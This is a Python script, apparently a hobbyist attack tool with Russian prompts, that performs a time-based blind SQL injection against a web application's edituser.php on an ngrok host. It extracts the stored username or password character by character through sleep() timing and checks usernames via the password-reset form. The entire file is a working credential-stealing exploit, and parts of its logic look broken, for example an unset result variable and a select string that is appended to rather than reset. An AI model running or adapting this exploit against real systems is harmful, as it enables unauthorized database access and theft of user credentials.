import time, requests, os
from bs4 import BeautifulSoup

letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
i = [1]

select = ''
def main():
	global select
	while True:
		try:
			a = int(input('1. Username\n2. Password\n\n>> '))
			if a == 1:
				select += 'username'
				check()
			elif a == 2:
				select += 'password'
				check()
			else:
				continue
		except:
			print('Ошибка!')
			exit()

data = ''
def check():
	print('Данные сохраняются в result.txt')
	global data
	global select
	for letter in letters:		
		url = f"http://53ce9dcc6ccb.ngrok.io/edituser.php?L=russian&Link=&LIMIT=&pmc_username=%27+union+select+if%28substring%28%28select+{select}+from+c_reg_users+limit+1%29%2C{i[0]}%2C1%29%3D%27{letter}%27%2Csleep%285%29%2C%27x%27%29%2Cnull%2Cnull%27&pmc_password=asd&login_form=%D0%92%D1%85%D0%BE%D0%B4"
		sending_time = int(time.time())
		r = requests.get(url = url)
		receive_time = int(time.time())
		gtime = receive_time - sending_time
		if gtime > 3:

			data = data+letter
			os.system('cls')
			if select == 'password':
				result = f'Пароль: {data}'
			elif select == 'username':
				url = f'http://53ce9dcc6ccb.ngrok.io/pass_reset.php?FORM_SEND=1&L=russian&U={data}&EMAIL=a%40a.ru&SECRET_QUESTION=1&SECRET_ANSWER=a&submit_type=%D0%A1%D0%B1%D1%80%D0%BE%D1%81%D0%B8%D1%82%D1%8C+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C'
				r = requests.get(url).text
				soup = BeautifulSoup(r, 'lxml')
				valid = soup.find('span', class_='error').text
				if 'Неправильное имя пользователя. Выберите свое' in valid:
					pass
				else:
					print(f'Имя Пользователя найден: {data}')
					with open('result.txt', 'w') as save:
						save.write(result)					
					input('Нажмите на ENTER для завершения программы..')
					exit()
				result = f'Имя пользователя: {data}'
			print(result)
			with open('result.txt', 'w') as save:
				save.write(result)
			i[0] += 1
			check()
		elif letter == 'z':
			i[0] += 1
			check()
		else:
			pass	

if __name__ == '__main__':
	main()